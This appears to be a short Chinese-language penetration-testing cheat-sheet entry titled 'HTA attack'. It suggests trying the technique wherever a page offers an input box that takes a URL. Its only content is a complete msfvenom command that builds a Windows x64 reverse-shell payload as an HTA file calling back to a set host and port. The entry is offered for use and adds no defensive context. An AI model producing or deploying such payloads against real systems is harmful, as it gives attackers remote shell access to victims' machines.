---
description: 当遇到可输入url的框子的时候，建议尝试
---

# hta攻击

1. 生成payload如下

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.194 LPORT=4422 -f hta-psh -o shell.hta
```
